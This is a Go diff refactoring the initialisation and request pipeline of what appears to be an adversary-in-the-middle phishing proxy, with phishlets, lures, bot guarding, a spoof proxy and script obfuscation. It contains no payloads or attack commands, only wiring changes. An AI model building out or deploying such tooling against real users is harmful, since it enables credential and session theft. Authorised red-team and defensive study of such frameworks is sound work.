@@ -65,7 +65,6 @@ type initializer struct {
 
 	lureStore     *sqlite.Lures
 	phishletStore *sqlite.Phishlets
-	resolver      *aitm.PhishletResolver
 	zones         map[string]aitm.ZoneConfig
 	dnsProviders  map[string]aitm.DNSProvider
 	botStore      *sqlite.Bots
@@ -132,9 +131,6 @@ func (ini *initializer) initStore() error {
 func (ini *initializer) initPhishlets() error {
 	ini.phishletStore = sqlite.NewPhishletStore(ini.db)
 	ini.lureStore = sqlite.NewLureStore(ini.db)
-	ini.resolver = aitm.NewPhishletResolver(ini.lureStore)
-
-	ini.loadPhishlets(ini.cfg.PhishletsDir, ini.resolver)
 
 	zones, err := ini.extractZones(ini.cfg.ExternalIPv4)
 	if err != nil {
@@ -226,20 +222,18 @@ func (ini *initializer) initServices() error {
 
 	ini.sessionStore = sqlite.NewSessionStore(ini.db)
 	ini.sessionSvc = &aitm.SessionService{Store: ini.sessionStore, Bus: ini.bus}
-	ini.lureSvc = &aitm.LureService{Store: ini.lureStore, Invalidator: ini.resolver}
 	ini.blacklistSvc = aitm.NewBlacklistService(ini.bus)
-	ini.spoofProxy = proxy.NewSpoofProxy("")
+	ini.spoofProxy = proxy.NewSpoofProxy(ini.cfg.SpoofURL, ini.logger)
 	ini.wsHub = proxy.NewWSHub(ini.bus, ini.logger)
 
-	phishletSvc := aitm.NewPhishletService(ini.phishletStore, ini.bus, ini.dnsService, ini.resolver)
-	if err := phishletSvc.LoadActiveFromDB(); err != nil {
-		return fmt.Errorf("loading active phishlets: %w", err)
+	phishletSvc := aitm.NewPhishletService(ini.phishletStore, ini.bus, ini.dnsService, ini.lureStore)
+	ini.loadPhishlets(ini.cfg.PhishletsDir, phishletSvc)
+	if err := phishletSvc.LoadFromDB(); err != nil {
+		return fmt.Errorf("loading phishlets from db: %w", err)
 	}
 	ini.phishletSvc = phishletSvc
 
-	if err := ini.resolver.LoadLuresFromDB(); err != nil {
-		return fmt.Errorf("loading lures: %w", err)
-	}
+	ini.lureSvc = &aitm.LureService{Store: ini.lureStore, Invalidator: phishletSvc}
 
 	ini.puppetSvc = ini.initPuppet()
 	ini.puppetSvc.Start()
@@ -299,16 +293,15 @@ func (ini *initializer) initProxy(version string) error {
 	}
 
 	pipeline := buildPipeline(pipelineDeps{
-		botGuardSvc:      ini.botGuardSvc,
-		blacklistSvc:     ini.blacklistSvc,
-		sessionSvc:       ini.sessionSvc,
-		phishletResolver: ini.resolver,
-		phishletSvc:      ini.phishletSvc,
-		spoofProxy:       ini.spoofProxy,
-		apiHandler:       apiHandler,
-		apiHostname:      ini.cfg.API.SecretHostname,
-		obfuscator:       ini.obfuscator,
-		puppetSvc:        ini.puppetSvc,
+		botGuardSvc:  ini.botGuardSvc,
+		blacklistSvc: ini.blacklistSvc,
+		sessionSvc:   ini.sessionSvc,
+		phishletSvc:  ini.phishletSvc,
+		spoofProxy:   ini.spoofProxy,
+		apiHandler:   apiHandler,
+		apiHostname:  ini.cfg.API.SecretHostname,
+		obfuscator:   ini.obfuscator,
+		puppetSvc:    ini.puppetSvc,
 	}, ini.logger)
 
 	aitmProxy := &proxy.AITMProxy{
@@ -345,7 +338,7 @@ func (ini *initializer) initWatcher() {
 	}
 	ini.phishletReloadSub = aitm.SubscribeFunc(ini.bus, aitm.EventPhishletReloaded, func(ev aitm.Event) {
 		if p, ok := ev.Payload.(*aitm.Phishlet); ok {
-			ini.resolver.Register(p)
+			ini.phishletSvc.Register(p)
 		}
 	})
 	ini.watcher.Start()
@@ -374,7 +367,7 @@ func (d *Daemon) SetUpstreamTransport(rt http.RoundTripper) {
 
 // ---- helpers ----------------------------------------------------------------
 
-func (d *Daemon) loadPhishlets(dir string, resolver *aitm.PhishletResolver) {
+func (d *Daemon) loadPhishlets(dir string, svc *aitm.PhishletService) {
 	entries, err := os.ReadDir(dir)
 	if err != nil {
 		d.logger.Warn("could not read phishlets directory", "dir", dir, "error", err)
@@ -399,7 +392,7 @@ func (d *Daemon) loadPhishlets(dir string, resolver *aitm.PhishletResolver) {
 			continue
 		}
 
-		resolver.Register(def)
+		svc.Register(def)
 		d.logger.Info("loaded phishlet", "name", def.Name)
 	}
 }
@@ -466,16 +459,15 @@ func loadOrGenerateCA(certPath string, logger *slog.Logger) (*api.CA, error) {
 // ---- pipeline ---------------------------------------------------------------
 
 type pipelineDeps struct {
-	botGuardSvc      *aitm.BotGuardService
-	blacklistSvc     *aitm.BlacklistService
-	sessionSvc       *aitm.SessionService
-	phishletResolver *aitm.PhishletResolver
-	phishletSvc      *aitm.PhishletService
-	spoofProxy       *proxy.SpoofProxy
-	apiHandler       *api.Router
-	apiHostname      string
-	obfuscator       scriptObfuscator
-	puppetSvc        *aitm.PuppetService
+	botGuardSvc  *aitm.BotGuardService
+	blacklistSvc *aitm.BlacklistService
+	sessionSvc   *aitm.SessionService
+	phishletSvc  *aitm.PhishletService
+	spoofProxy   *proxy.SpoofProxy
+	apiHandler   *api.Router
+	apiHostname  string
+	obfuscator   scriptObfuscator
+	puppetSvc    *aitm.PuppetService
 }
 
 func buildPipeline(d pipelineDeps, logger *slog.Logger) *proxy.Pipeline {
@@ -496,16 +488,14 @@ func buildPipeline(d pipelineDeps, logger *slog.Logger) *proxy.Pipeline {
 				Handler:        d.apiHandler,
 			},
 			&request.PhishletRouter{
-				Hostnames: d.phishletSvc,
-				Resolver:  d.phishletResolver,
-				Spoof:     d.spoofProxy,
+				Resolver: d.phishletSvc,
+				Spoof:    d.spoofProxy,
 			},
-			&request.LureValidator{
-				Spoof: d.spoofProxy,
-			},
-			&request.SessionResolver{
+			&request.SessionGate{
 				Sessions: d.sessionSvc,
+				Spoof:    d.spoofProxy,
 			},
+			&request.LureRedirector{},
 			&request.PuppetOverrideResolver{
 				Source: d.puppetSvc,
 			},
